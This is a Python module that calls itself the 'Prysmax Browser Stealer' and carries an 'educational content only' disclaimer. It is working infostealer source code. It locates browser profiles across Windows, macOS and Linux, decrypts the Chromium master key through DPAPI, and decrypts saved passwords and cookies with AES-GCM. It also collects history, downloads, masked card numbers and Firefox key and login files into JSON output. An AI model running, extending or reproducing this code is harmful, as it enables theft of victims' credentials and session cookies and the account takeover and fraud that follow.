#!/usr/bin/env python3
"""
Prysmax Browser Stealer Module
Educational content only

This module extracts data from various web browsers for security research purposes.
Cross-platform support with enhanced error handling and logging.
"""

import os
import sys
import json
import sqlite3
import shutil
import base64
import platform
import logging
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Platform-specific imports
try:
    if platform.system() == "Windows":
        import win32crypt
        from Crypto.Cipher import AES
        WINDOWS_CRYPTO_AVAILABLE = True
    else:
        WINDOWS_CRYPTO_AVAILABLE = False
except ImportError:
    WINDOWS_CRYPTO_AVAILABLE = False
    logger.warning("Windows cryptography modules not available")

class BrowserStealer:
    """
    Cross-platform browser data extraction class.
    Supports Chrome, Firefox, Edge, Opera, Brave, Safari, and Vivaldi.
    """
    
    def __init__(self, output_dir: str):
        self.output_dir = output_dir
        self.platform = platform.system().lower()
        self.browsers = self._get_browser_paths()
        
        logger.info(f"BrowserStealer initialized for {self.platform} platform")
        
    def _get_browser_paths(self) -> Dict[str, Dict[str, Any]]:
        """Get browser paths based on operating system"""
        if self.platform == "windows":
            return {
                "Chrome": {
                    "path": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"),
                    "profiles": ["Default", "Profile 1", "Profile 2", "Profile 3"],
                    "type": "chromium"
                },
                "Edge": {
                    "path": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"),
                    "profiles": ["Default", "Profile 1", "Profile 2"],
                    "type": "chromium"
                },
                "Firefox": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
                    "profiles": [],
                    "type": "firefox"
                },
                "Opera": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"),
                    "profiles": ["Default"],
                    "type": "chromium"
                },
                "OperaGX": {
                    "path": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera GX Stable"),
                    "profiles": ["Default"],
                    "type": "chromium"
                },
                "Brave": {
                    "path": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
                    "profiles": ["Default", "Profile 1"],
                    "type": "chromium"
                },
                "Vivaldi": {
                    "path": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data"),
                    "profiles": ["Default"],
                    "type": "chromium"
                }
            }
        elif self.platform == "darwin":  # macOS
            return {
                "Chrome": {
                    "path": os.path.expanduser("~/Library/Application Support/Google/Chrome"),
                    "profiles": ["Default", "Profile 1", "Profile 2"],
                    "type": "chromium"
                },
                "Safari": {
                    "path": os.path.expanduser("~/Library/Safari"),
                    "profiles": ["Default"],
                    "type": "safari"
                },
                "Firefox": {
                    "path": os.path.expanduser("~/Library/Application Support/Firefox/Profiles"),
                    "profiles": [],
                    "type": "firefox"
                },
                "Edge": {
                    "path": os.path.expanduser("~/Library/Application Support/Microsoft Edge"),
                    "profiles": ["Default"],
                    "type": "chromium"
                },
                "Brave": {
                    "path": os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser"),
                    "profiles": ["Default"],
                    "type": "chromium"
                }
            }
        else:  # Linux
            return {
                "Chrome": {
                    "path": os.path.expanduser("~/.config/google-chrome"),
                    "profiles": ["Default", "Profile 1", "Profile 2"],
                    "type": "chromium"
                },
                "Chromium": {
                    "path": os.path.expanduser("~/.config/chromium"),
                    "profiles": ["Default"],
                    "type": "chromium"
                },
                "Firefox": {
                    "path": os.path.expanduser("~/.mozilla/firefox"),
                    "profiles": [],
                    "type": "firefox"
                },
                "Brave": {
                    "path": os.path.expanduser("~/.config/BraveSoftware/Brave-Browser"),
                    "profiles": ["Default"],
                    "type": "chromium"
                }
            }
        
    def steal(self) -> bool:
        """
        Main browser stealing function with enhanced error handling
        
        Returns:
            bool: True if any data was successfully extracted
        """
        success = False
        try:
            browser_dir = os.path.join(self.output_dir, "Browsers")
            os.makedirs(browser_dir, exist_ok=True)
            
            logger.info(f"Starting browser data extraction to {browser_dir}")
            
            for browser_name, browser_info in self.browsers.items():
                try:
                    if self._steal_browser_data(browser_name, browser_info, browser_dir):
                        success = True
                        logger.info(f"Successfully extracted data from {browser_name}")
                    else:
                        logger.debug(f"No data found for {browser_name}")
                except Exception as e:
                    logger.error(f"Error stealing {browser_name}: {e}")
                    
            # Generate summary report
            self._generate_summary_report(browser_dir)
            
        except Exception as e:
            logger.error(f"General browser stealer error: {e}")
            
        return success
    
    def _steal_browser_data(self, browser_name: str, browser_info: Dict, output_dir: str) -> bool:
        """
        Steal data from specific browser
        
        Args:
            browser_name: Name of the browser
            browser_info: Browser configuration dictionary
            output_dir: Output directory path
            
        Returns:
            bool: True if data was extracted successfully
        """
        browser_path = browser_info["path"]
        
        if not os.path.exists(browser_path):
            logger.debug(f"{browser_name} not found at {browser_path}")
            return False
        
        browser_output = os.path.join(output_dir, browser_name)
        os.makedirs(browser_output, exist_ok=True)
        
        success = False
        browser_type = browser_info.get("type", "chromium")
        
        if browser_type == "firefox":
            success = self._steal_firefox_data(browser_path, browser_output)
        elif browser_type == "safari":
            success = self._steal_safari_data(browser_path, browser_output)
        else:  # chromium-based
            # Get master key for Chromium-based browsers
            master_key = self._get_master_key(browser_path)
            
            # Handle profiles
            for profile in browser_info["profiles"]:
                profile_path = os.path.join(browser_path, profile)
                if os.path.exists(profile_path):
                    if self._steal_chromium_profile(profile_path, browser_output, profile, master_key):
                        success = True
        
        return success
    
    def _get_master_key(self, browser_path: str) -> Optional[bytes]:
        """
        Get master key for Chromium-based browsers
        
        Args:
            browser_path: Path to browser data directory
            
        Returns:
            bytes: Master key or None if not available
        """
        try:
            if not WINDOWS_CRYPTO_AVAILABLE and self.platform == "windows":
                logger.warning("Windows cryptography not available, passwords will not be decrypted")
                return None
                
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                logger.debug(f"Local State file not found at {local_state_path}")
                return None
            
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
                logger.debug("No encryption key found in Local State")
                return None
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            
            if self.platform == "windows" and WINDOWS_CRYPTO_AVAILABLE:
                # Remove DPAPI prefix
                encrypted_key = encrypted_key[5:]
                return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            else:
                # For non-Windows platforms, return the encrypted key as-is
                # Real decryption would require platform-specific implementation
                logger.warning("Cross-platform decryption not fully implemented")
                return encrypted_key
                
        except Exception as e:
            logger.error(f"Error getting master key: {e}")
            return None
    
    
    def _decrypt_password(self, encrypted_password: bytes, master_key: Optional[bytes]) -> str:
        """
        Decrypt password using master key with cross-platform support
        
        Args:
            encrypted_password: Encrypted password bytes
            master_key: Master decryption key
            
        Returns:
            str: Decrypted password or placeholder
        """
        try:
            if not master_key:
                return "[KEY_NOT_AVAILABLE]"
                
            if self.platform == "windows" and WINDOWS_CRYPTO_AVAILABLE:
                if encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11':
                    # AES encryption (newer Chrome versions)
                    iv = encrypted_password[3:15]
                    encrypted_password = encrypted_password[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    return cipher.decrypt(encrypted_password)[:-16].decode('utf-8')
                else:
                    # DPAPI encryption (older versions)
                    return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
            else:
                # For non-Windows platforms
                return "[CROSS_PLATFORM_DECRYPT_NOT_IMPLEMENTED]"
                
        except Exception as e:
            logger.error(f"Password decryption error: {e}")
            return "[DECRYPT_ERROR]"
    
    def _steal_chromium_profile(self, profile_path: str, output_dir: str, profile_name: str, master_key: Optional[bytes]) -> bool:
        """
        Steal data from Chromium profile with enhanced error handling
        
        Args:
            profile_path: Path to browser profile
            output_dir: Output directory
            profile_name: Name of the profile
            master_key: Master key for decryption
            
        Returns:
            bool: True if any data was extracted
        """
        profile_output = os.path.join(output_dir, profile_name)
        os.makedirs(profile_output, exist_ok=True)
        
        success = False
        
        # Steal different types of data
        data_methods = [
            ("passwords", self._steal_passwords),
            ("cookies", self._steal_cookies),
            ("history", self._steal_history),
            ("bookmarks", self._steal_bookmarks),
            ("credit_cards", self._steal_credit_cards),
            ("downloads", self._steal_downloads),
            ("search_engines", self._steal_search_engines)
        ]
        
        for data_type, method in data_methods:
            try:
                if method(profile_path, profile_output, master_key):
                    success = True
                    logger.debug(f"Successfully extracted {data_type} from {profile_name}")
            except Exception as e:
                logger.error(f"Error extracting {data_type} from {profile_name}: {e}")
        
        return success
    
    def _steal_passwords(self, profile_path: str, output_dir: str, master_key: Optional[bytes]) -> bool:
        """
        Steal saved passwords with enhanced data extraction
        
        Args:
            profile_path: Path to browser profile
            output_dir: Output directory
            master_key: Master key for decryption
            
        Returns:
            bool: True if passwords were found and extracted
        """
        try:
            login_db_path = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db_path):
                return False
            
            # Copy database to avoid locks
            temp_db = os.path.join(output_dir, "temp_login.db")
            shutil.copy2(login_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Enhanced query with more fields
            cursor.execute("""
                SELECT origin_url, username_value, password_value, 
                       date_created, date_last_used, times_used
                FROM logins
            """)
            
            passwords = []
            
            for row in cursor.fetchall():
                url, username, encrypted_password, date_created, date_last_used, times_used = row
                if encrypted_password:
                    password = self._decrypt_password(encrypted_password, master_key)
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": password,
                        "date_created": date_created,
                        "date_last_used": date_last_used,
                        "times_used": times_used
                    })
            
            conn.close()
            os.remove(temp_db)
            
            # Save passwords
            if passwords:
                output_file = os.path.join(output_dir, "passwords.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(passwords, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(passwords)} passwords")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing passwords: {e}")
            
        return False
    
    
    def _steal_cookies(self, profile_path: str, output_dir: str, master_key: Optional[bytes]) -> bool:
        """Steal cookies with enhanced extraction"""
        try:
            # Try different cookie database locations
            cookies_paths = [
                os.path.join(profile_path, "Network", "Cookies"),
                os.path.join(profile_path, "Cookies")
            ]
            
            cookies_db_path = None
            for path in cookies_paths:
                if os.path.exists(path):
                    cookies_db_path = path
                    break
            
            if not cookies_db_path:
                return False
            
            temp_db = os.path.join(output_dir, "temp_cookies.db")
            shutil.copy2(cookies_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Enhanced cookie query
            cursor.execute("""
                SELECT host_key, name, encrypted_value, path, expires_utc, 
                       is_secure, is_httponly, creation_utc, last_access_utc
                FROM cookies
            """)
            
            cookies = []
            
            for row in cursor.fetchall():
                (host, name, encrypted_value, path, expires, 
                 is_secure, is_httponly, creation, last_access) = row
                
                if encrypted_value:
                    value = self._decrypt_password(encrypted_value, master_key)
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": value,
                        "path": path,
                        "expires": expires,
                        "secure": bool(is_secure),
                        "httponly": bool(is_httponly),
                        "creation_time": creation,
                        "last_access": last_access
                    })
            
            conn.close()
            os.remove(temp_db)
            
            if cookies:
                output_file = os.path.join(output_dir, "cookies.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(cookies, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(cookies)} cookies")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing cookies: {e}")
            
        return False
    
    def _steal_history(self, profile_path: str, output_dir: str, master_key: Optional[bytes] = None) -> bool:
        """Steal browsing history with enhanced data"""
        try:
            history_db_path = os.path.join(profile_path, "History")
            if not os.path.exists(history_db_path):
                return False
            
            temp_db = os.path.join(output_dir, "temp_history.db")
            shutil.copy2(history_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Enhanced history query with more details
            cursor.execute("""
                SELECT url, title, visit_count, typed_count, 
                       last_visit_time, hidden
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT 5000
            """)
            
            history = []
            
            for row in cursor.fetchall():
                url, title, visit_count, typed_count, last_visit, hidden = row
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "typed_count": typed_count,
                    "last_visit": last_visit,
                    "hidden": bool(hidden)
                })
            
            conn.close()
            os.remove(temp_db)
            
            if history:
                output_file = os.path.join(output_dir, "history.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(history, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(history)} history entries")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing history: {e}")
            
        return False
    
    def _steal_bookmarks(self, profile_path: str, output_dir: str, master_key: Optional[bytes] = None) -> bool:
        """Steal bookmarks"""
        try:
            bookmarks_path = os.path.join(profile_path, "Bookmarks")
            if os.path.exists(bookmarks_path):
                output_file = os.path.join(output_dir, "bookmarks.json")
                shutil.copy2(bookmarks_path, output_file)
                logger.info("Extracted bookmarks")
                return True
        except Exception as e:
            logger.error(f"Error stealing bookmarks: {e}")
        return False
    
    def _steal_credit_cards(self, profile_path: str, output_dir: str, master_key: Optional[bytes]) -> bool:
        """Steal saved credit cards with enhanced security"""
        try:
            cards_db_path = os.path.join(profile_path, "Web Data")
            if not os.path.exists(cards_db_path):
                return False
            
            temp_db = os.path.join(output_dir, "temp_cards.db")
            shutil.copy2(cards_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT name_on_card, card_number_encrypted, 
                       expiration_month, expiration_year, date_modified
                FROM credit_cards
            """)
            
            cards = []
            
            for row in cursor.fetchall():
                name, encrypted_number, exp_month, exp_year, date_modified = row
                if encrypted_number:
                    # Only decrypt first/last 4 digits for security demonstration
                    card_number = self._decrypt_password(encrypted_number, master_key)
                    if len(card_number) > 8:
                        masked_number = card_number[:4] + "*" * (len(card_number) - 8) + card_number[-4:]
                    else:
                        masked_number = "*" * len(card_number)
                    
                    cards.append({
                        "name": name,
                        "number": masked_number,  # Masked for security
                        "exp_month": exp_month,
                        "exp_year": exp_year,
                        "date_modified": date_modified
                    })
            
            conn.close()
            os.remove(temp_db)
            
            if cards:
                output_file = os.path.join(output_dir, "credit_cards.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(cards, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(cards)} credit cards (masked)")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing credit cards: {e}")
            
        return False
    
    
    def _steal_downloads(self, profile_path: str, output_dir: str, master_key: Optional[bytes] = None) -> bool:
        """Steal download history"""
        try:
            history_db_path = os.path.join(profile_path, "History")
            if not os.path.exists(history_db_path):
                return False
            
            temp_db = os.path.join(output_dir, "temp_downloads.db")
            shutil.copy2(history_db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if downloads table exists
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='downloads'")
            if not cursor.fetchone():
                conn.close()
                os.remove(temp_db)
                return False
            
            cursor.execute("""
                SELECT tab_url, target_path, total_bytes, 
                       start_time, end_time, state
                FROM downloads 
                ORDER BY start_time DESC 
                LIMIT 1000
            """)
            
            downloads = []
            
            for row in cursor.fetchall():
                tab_url, target_path, total_bytes, start_time, end_time, state = row
                downloads.append({
                    "source_url": tab_url,
                    "file_path": target_path,
                    "file_size": total_bytes,
                    "start_time": start_time,
                    "end_time": end_time,
                    "state": state
                })
            
            conn.close()
            os.remove(temp_db)
            
            if downloads:
                output_file = os.path.join(output_dir, "downloads.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(downloads, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(downloads)} downloads")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing downloads: {e}")
            
        return False
    
    def _steal_search_engines(self, profile_path: str, output_dir: str, master_key: Optional[bytes] = None) -> bool:
        """Steal custom search engines"""
        try:
            web_data_path = os.path.join(profile_path, "Web Data")
            if not os.path.exists(web_data_path):
                return False
            
            temp_db = os.path.join(output_dir, "temp_search.db")
            shutil.copy2(web_data_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Check if keywords table exists (search engines)
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='keywords'")
            if not cursor.fetchone():
                conn.close()
                os.remove(temp_db)
                return False
            
            cursor.execute("""
                SELECT short_name, keyword, url, favicon_url
                FROM keywords
            """)
            
            search_engines = []
            
            for row in cursor.fetchall():
                short_name, keyword, url, favicon_url = row
                search_engines.append({
                    "name": short_name,
                    "keyword": keyword,
                    "url": url,
                    "favicon": favicon_url
                })
            
            conn.close()
            os.remove(temp_db)
            
            if search_engines:
                output_file = os.path.join(output_dir, "search_engines.json")
                with open(output_file, "w", encoding='utf-8') as f:
                    json.dump(search_engines, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(search_engines)} search engines")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing search engines: {e}")
            
        return False
    
    def _steal_firefox_data(self, firefox_path: str, output_dir: str) -> bool:
        """
        Steal Firefox data with enhanced profile detection
        
        Args:
            firefox_path: Path to Firefox profiles directory
            output_dir: Output directory
            
        Returns:
            bool: True if any data was extracted
        """
        try:
            success = False
            
            # Firefox profiles can be detected from profiles.ini
            profiles_ini = os.path.join(os.path.dirname(firefox_path), "profiles.ini")
            detected_profiles = []
            
            if os.path.exists(profiles_ini):
                # Parse profiles.ini to get profile names
                with open(profiles_ini, 'r', encoding='utf-8') as f:
                    content = f.read()
                    import re
                    profile_matches = re.findall(r'Path=(.+)', content)
                    detected_profiles.extend(profile_matches)
            
            # Also scan directory for any profile folders
            if os.path.exists(firefox_path):
                for item in os.listdir(firefox_path):
                    item_path = os.path.join(firefox_path, item)
                    if os.path.isdir(item_path):
                        detected_profiles.append(item)
            
            # Remove duplicates
            detected_profiles = list(set(detected_profiles))
            
            for profile_name in detected_profiles:
                profile_path = os.path.join(firefox_path, profile_name)
                if os.path.exists(profile_path):
                    if self._steal_firefox_profile(profile_path, output_dir, profile_name):
                        success = True
                        
            return success
                        
        except Exception as e:
            logger.error(f"Error stealing Firefox data: {e}")
            return False
    
    def _steal_firefox_profile(self, profile_path: str, output_dir: str, profile_name: str) -> bool:
        """
        Steal data from Firefox profile with enhanced file detection
        
        Args:
            profile_path: Path to Firefox profile
            output_dir: Output directory
            profile_name: Name of the profile
            
        Returns:
            bool: True if any data was extracted
        """
        try:
            profile_output = os.path.join(output_dir, f"Firefox_{profile_name}")
            os.makedirs(profile_output, exist_ok=True)
            
            success = False
            
            # Firefox files to copy with descriptions
            firefox_files = {
                "places.sqlite": "History and bookmarks",
                "cookies.sqlite": "Cookies", 
                "logins.json": "Saved passwords metadata",
                "key4.db": "Master password key",
                "cert9.db": "Certificates",
                "formhistory.sqlite": "Form history",
                "permissions.sqlite": "Site permissions",
                "content-prefs.sqlite": "Content preferences",
                "sessionstore.jsonlz4": "Session data",
                "addons.json": "Extension data",
                "extension-preferences.json": "Extension preferences"
            }
            
            extracted_files = []
            
            for file_name, description in firefox_files.items():
                file_path = os.path.join(profile_path, file_name)
                if os.path.exists(file_path):
                    try:
                        dest_path = os.path.join(profile_output, file_name)
                        shutil.copy2(file_path, dest_path)
                        extracted_files.append({"file": file_name, "description": description})
                        success = True
                    except Exception as e:
                        logger.error(f"Error copying {file_name}: {e}")
            
            # Create manifest of extracted files
            if extracted_files:
                manifest_path = os.path.join(profile_output, "extraction_manifest.json")
                with open(manifest_path, "w", encoding='utf-8') as f:
                    json.dump({
                        "profile_name": profile_name,
                        "extraction_date": datetime.now().isoformat(),
                        "extracted_files": extracted_files
                    }, f, indent=2, ensure_ascii=False)
                
                logger.info(f"Extracted {len(extracted_files)} Firefox files from {profile_name}")
                        
            return success
            
        except Exception as e:
            logger.error(f"Error stealing Firefox profile {profile_name}: {e}")
            return False
    
    def _steal_safari_data(self, safari_path: str, output_dir: str) -> bool:
        """
        Steal Safari data (macOS)
        
        Args:
            safari_path: Path to Safari data directory
            output_dir: Output directory
            
        Returns:
            bool: True if any data was extracted
        """
        try:
            safari_output = os.path.join(output_dir, "Safari")
            os.makedirs(safari_output, exist_ok=True)
            
            success = False
            
            # Safari files to extract
            safari_files = {
                "History.db": "Browsing history",
                "Cookies.binarycookies": "Cookies",
                "Bookmarks.plist": "Bookmarks",
                "Downloads.plist": "Download history",
                "TopSites.plist": "Top sites",
                "LastSession.plist": "Last session"
            }
            
            for file_name, description in safari_files.items():
                file_path = os.path.join(safari_path, file_name)
                if os.path.exists(file_path):
                    try:
                        dest_path = os.path.join(safari_output, file_name)
                        shutil.copy2(file_path, dest_path)
                        success = True
                        logger.debug(f"Extracted Safari {description}")
                    except Exception as e:
                        logger.error(f"Error copying Safari {file_name}: {e}")
            
            return success
            
        except Exception as e:
            logger.error(f"Error stealing Safari data: {e}")
            return False
    
    def _generate_summary_report(self, browser_dir: str) -> None:
        """
        Generate a summary report of extracted browser data
        
        Args:
            browser_dir: Browser output directory
        """
        try:
            summary = {
                "extraction_date": datetime.now().isoformat(),
                "platform": self.platform,
                "browsers_scanned": list(self.browsers.keys()),
                "browsers_found": [],
                "total_files": 0,
                "data_types": {
                    "passwords": 0,
                    "cookies": 0,
                    "history": 0,
                    "bookmarks": 0,
                    "credit_cards": 0,
                    "downloads": 0
                }
            }
            
            # Scan extracted data
            for browser_name in os.listdir(browser_dir):
                browser_path = os.path.join(browser_dir, browser_name)
                if os.path.isdir(browser_path):
                    summary["browsers_found"].append(browser_name)
                    
                    # Count files and data types
                    for root, dirs, files in os.walk(browser_path):
                        summary["total_files"] += len(files)
                        
                        for file in files:
                            if "password" in file.lower():
                                summary["data_types"]["passwords"] += 1
                            elif "cookie" in file.lower():
                                summary["data_types"]["cookies"] += 1
                            elif "history" in file.lower():
                                summary["data_types"]["history"] += 1
                            elif "bookmark" in file.lower():
                                summary["data_types"]["bookmarks"] += 1
                            elif "credit" in file.lower():
                                summary["data_types"]["credit_cards"] += 1
                            elif "download" in file.lower():
                                summary["data_types"]["downloads"] += 1
            
            # Save summary report
            summary_path = os.path.join(browser_dir, "extraction_summary.json")
            with open(summary_path, "w", encoding='utf-8') as f:
                json.dump(summary, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Generated extraction summary: {len(summary['browsers_found'])} browsers, {summary['total_files']} files")
            
        except Exception as e:
            logger.error(f"Error generating summary report: {e}")


# Enhanced browser stealer with additional features
class AdvancedBrowserStealer(BrowserStealer):
    """
    Advanced browser stealer with additional features like extension data extraction
    """
    
    def __init__(self, output_dir: str):
        super().__init__(output_dir)
        
    def steal_browser_extensions(self, browser_path: str, output_dir: str) -> bool:
        """Extract browser extension data"""
        try:
            extensions_dir = os.path.join(browser_path, "Default", "Extensions")
            if not os.path.exists(extensions_dir):
                return False
            
            ext_output = os.path.join(output_dir, "Extensions")
            os.makedirs(ext_output, exist_ok=True)
            
            extensions_info = []
            
            for ext_id in os.listdir(extensions_dir):
                ext_path = os.path.join(extensions_dir, ext_id)
                if os.path.isdir(ext_path):
                    # Look for manifest files
                    for version in os.listdir(ext_path):
                        version_path = os.path.join(ext_path, version)
                        manifest_path = os.path.join(version_path, "manifest.json")
                        
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    extensions_info.append({
                                        "id": ext_id,
                                        "version": version,
                                        "name": manifest.get("name", "Unknown"),
                                        "description": manifest.get("description", ""),
                                        "permissions": manifest.get("permissions", [])
                                    })
                            except Exception as e:
                                logger.error(f"Error reading extension manifest {ext_id}: {e}")
            
            if extensions_info:
                ext_file = os.path.join(ext_output, "extensions.json")
                with open(ext_file, "w", encoding='utf-8') as f:
                    json.dump(extensions_info, f, indent=2, ensure_ascii=False)
                logger.info(f"Extracted {len(extensions_info)} browser extensions")
                return True
                
        except Exception as e:
            logger.error(f"Error stealing browser extensions: {e}")
            
        return False

